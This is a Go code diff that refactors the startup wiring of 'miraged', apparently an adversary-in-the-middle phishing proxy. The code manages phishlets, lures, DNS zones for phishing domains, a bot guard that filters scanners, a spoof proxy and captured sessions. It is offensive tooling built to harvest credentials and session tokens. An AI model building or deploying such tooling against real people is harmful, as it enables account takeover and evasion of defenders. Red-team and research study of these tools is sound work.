@@ -41,6 +41,7 @@ type Daemon struct {
 	dnsService        *aitm.DNSService
 	watcher           *phishlet.Watcher
 	phishletReloadSub <-chan aitm.Event
+	certSource        *cert.SelfSignedCertSource
 
 	// Proxy.
 	proxy *proxy.AITMProxy
@@ -49,27 +50,26 @@ type Daemon struct {
 	obfuscator scriptObfuscator
 
 	// Services needed by health check and reload.
-	phishletStore *sqlite.Phishlets
-	sessionSvc    *aitm.SessionService
+	phishletSvc *aitm.PhishletService
+	sessionSvc  *aitm.SessionService
 }
 
 // initializer carries transient build-time state
 type initializer struct {
 	*Daemon
 
-	lureStore       *sqlite.Lures
-	resolver        *aitm.PhishletResolver
-	activeHostnames *proxy.ActiveHostnameSet
-	activeCount     int
-	zones           map[string]aitm.ZoneConfig
-	certSource      *cert.SelfSignedCertSource
-	botStore        *sqlite.Bots
-	botGuardSvc     *aitm.BotGuardService
-	sessionStore    aitm.SessionStore
-	lureSvc         *aitm.LureService
-	blacklistSvc    *aitm.BlacklistService
-	spoofProxy      *proxy.SpoofProxy
-	wsHub           *proxy.WSHub
+	lureStore    *sqlite.Lures
+	phishletStore *sqlite.Phishlets
+	resolver     *aitm.PhishletResolver
+	zones        map[string]aitm.ZoneConfig
+	certSource   *cert.SelfSignedCertSource
+	botStore     *sqlite.Bots
+	botGuardSvc  *aitm.BotGuardService
+	sessionStore aitm.SessionStore
+	lureSvc      *aitm.LureService
+	blacklistSvc *aitm.BlacklistService
+	spoofProxy   *proxy.SpoofProxy
+	wsHub        *proxy.WSHub
 }
 
 // New constructs and fully wires a Daemon. Returns an error if any
@@ -110,12 +110,13 @@ func New(ctx context.Context, configPath string, developer bool, version string,
 
 	ini.initWatcher()
 
+	activeCount := ini.countActive()
 	logger.Info("miraged ready",
 		"version", version,
 		"domain", cfg.Domain,
 		"https_port", cfg.HTTPSPort,
 		"api_hostname", cfg.API.SecretHostname,
-		"active_phishlets", ini.activeCount,
+		"active_phishlets", activeCount,
 	)
 
 	return ini.Daemon, nil
@@ -135,19 +136,37 @@ func (ini *initializer) initPhishlets() error {
 	ini.phishletStore = sqlite.NewPhishletStore(ini.db)
 	ini.lureStore = sqlite.NewLureStore(ini.db)
 	ini.resolver = aitm.NewPhishletResolver(ini.phishletStore, ini.lureStore)
-	ini.activeHostnames = &proxy.ActiveHostnameSet{}
 
 	ini.loadPhishletDefs(ini.cfg.PhishletsDir, ini.resolver)
 
-	activeCount, zones, err := ini.populateActivePhishlets(ini.cfg.ExternalIPv4, ini.activeHostnames)
+	zones, err := ini.extractZones(ini.cfg.ExternalIPv4)
 	if err != nil {
 		return err
 	}
-
-	ini.activeCount = activeCount
 	ini.zones = zones
 
 	return nil
+}
+
+// extractZones reads enabled phishlet configs and builds the DNS zone map
+// needed by DNSService. This is separate from LoadActiveFromDB so DNS can be
+// initialised before PhishletService is fully wired.
+func (ini *initializer) extractZones(externalIP string) (map[string]aitm.ZoneConfig, error) {
+	configs, err := ini.phishletStore.ListPhishletConfigs()
+	if err != nil {
+		return nil, fmt.Errorf("listing phishlet configs: %w", err)
+	}
+	zones := make(map[string]aitm.ZoneConfig)
+	for _, pcfg := range configs {
+		if pcfg.Enabled && pcfg.BaseDomain != "" && pcfg.DNSProvider != "" {
+			zones[pcfg.BaseDomain] = aitm.ZoneConfig{
+				Zone:         pcfg.BaseDomain,
+				ProviderName: pcfg.DNSProvider,
+				ExternalIP:   externalIP,
+			}
+		}
+	}
+	return zones, nil
 }
 
 func (ini *initializer) initDNS() error {
@@ -167,7 +186,11 @@ func (ini *initializer) initCerts(developer bool) error {
 	if err != nil {
 		return err
 	}
+	if err := src.EnsureCA(); err != nil {
+		return fmt.Errorf("initializing CA: %w", err)
+	}
 	ini.certSource = src
+	ini.Daemon.certSource = src
 
 	return nil
 }
@@ -180,11 +203,14 @@ func (ini *initializer) initServices() error {
 				Enabled:            true,
 				TelemetryThreshold: 0.6,
 			},
-			SignatureFinder: ini.botStore,
-			Logger:          ini.logger,
+			Logger: ini.logger,
 		},
-		Store: ini.botStore,
-		Bus:   ini.bus,
+		Store:         ini.botStore,
+		SignatureStore: ini.botStore,
+		Bus:           ini.bus,
+	}
+	if err := ini.botGuardSvc.LoadSignaturesFromDB(); err != nil {
+		return fmt.Errorf("loading bot signatures: %w", err)
 	}
 
 	ini.sessionStore = sqlite.NewSessionStore(ini.db)
@@ -194,6 +220,12 @@ func (ini *initializer) initServices() error {
 	ini.spoofProxy = proxy.NewSpoofProxy("")
 	ini.wsHub = proxy.NewWSHub(ini.bus, ini.logger)
 
+	phishletSvc := aitm.NewPhishletService(ini.phishletStore, ini.bus, ini.dnsService)
+	if err := phishletSvc.LoadActiveFromDB(); err != nil {
+		return fmt.Errorf("loading active phishlets: %w", err)
+	}
+	ini.Daemon.phishletSvc = phishletSvc
+
 	return nil
 }
 
@@ -201,9 +233,9 @@ func (ini *initializer) initProxy(version string) error {
 	apiHandler := api.NewRouter(api.RouterDeps{
 		Sessions:  ini.sessionSvc,
 		Lures:     ini.lureSvc,
-		Phishlets: ini.phishletStore,
+		Phishlets: ini.Daemon.phishletSvc,
 		Blacklist: ini.blacklistSvc,
-		Botguard:  ini.botStore,
+		Botguard:  ini.botGuardSvc,
 		Bus:       ini.bus,
 		Domain:    ini.cfg.Domain,
 		Version:   version,
@@ -226,7 +258,7 @@ func (ini *initializer) initProxy(version string) error {
 		sessionSvc:       ini.sessionSvc,
 		sessionStore:     ini.sessionStore,
 		phishletResolver: ini.resolver,
-		activeHostnames:  ini.activeHostnames,
+		phishletSvc:      ini.Daemon.phishletSvc,
 		spoofProxy:       ini.spoofProxy,
 		bus:              ini.bus,
 		apiHandler:       apiHandler,
@@ -273,31 +305,21 @@ func (ini *initializer) initWatcher() {
 	ini.watcher.Start()
 }
 
-func (d *Daemon) populateActivePhishlets(externalIP string, activeHostnames *proxy.ActiveHostnameSet) (int, map[string]aitm.ZoneConfig, error) {
-	configs, err := d.phishletStore.ListPhishletConfigs()
+func (ini *initializer) countActive() int {
+	configs, err := ini.Daemon.phishletSvc.ListConfigs()
 	if err != nil {
-		return 0, nil, fmt.Errorf("listing phishlet configs: %w", err)
+		return 0
 	}
-	zones := make(map[string]aitm.ZoneConfig)
-	activeCount := 0
-	for _, pcfg := range configs {
-		if !pcfg.Enabled {
-			continue
-		}
-		activeCount++
-		if pcfg.Hostname != "" {
-			activeHostnames.Add(pcfg.Hostname)
-		}
-		if pcfg.BaseDomain != "" && pcfg.DNSProvider != "" {
-			zones[pcfg.BaseDomain] = aitm.ZoneConfig{
-				Zone:         pcfg.BaseDomain,
-				ProviderName: pcfg.DNSProvider,
-				ExternalIP:   externalIP,
-			}
+	n := 0
+	for _, cfg := range configs {
+		if cfg.Enabled {
+			n++
 		}
 	}
-	return activeCount, zones, nil
+	return n
 }
+
+// ---- helpers ----------------------------------------------------------------
 
 func (d *Daemon) loadPhishletDefs(dir string, resolver *aitm.PhishletResolver) {
 	entries, err := os.ReadDir(dir)
@@ -388,13 +410,15 @@ func loadOrGenerateCA(certPath string, logger *slog.Logger) (*api.CA, error) {
 	return api.Load(certPath)
 }
 
+// ---- pipeline ---------------------------------------------------------------
+
 type pipelineDeps struct {
 	botGuardSvc      *aitm.BotGuardService
 	blacklistSvc     *aitm.BlacklistService
 	sessionSvc       *aitm.SessionService
 	sessionStore     aitm.SessionStore
 	phishletResolver *aitm.PhishletResolver
-	activeHostnames  *proxy.ActiveHostnameSet
+	phishletSvc      *aitm.PhishletService
 	spoofProxy       *proxy.SpoofProxy
 	bus              aitm.EventBus
 	apiHandler       *api.Router
@@ -420,9 +444,9 @@ func buildPipeline(d pipelineDeps, logger *slog.Logger) *proxy.Pipeline {
 				Handler:        d.apiHandler,
 			},
 			&request.PhishletRouter{
-				ActiveHostnameSet: d.activeHostnames,
-				Resolver:          d.phishletResolver,
-				Spoof:             d.spoofProxy,
+				Hostnames: d.phishletSvc,
+				Resolver:  d.phishletResolver,
+				Spoof:     d.spoofProxy,
 			},
 			&request.LureValidator{
 				Spoof: d.spoofProxy,
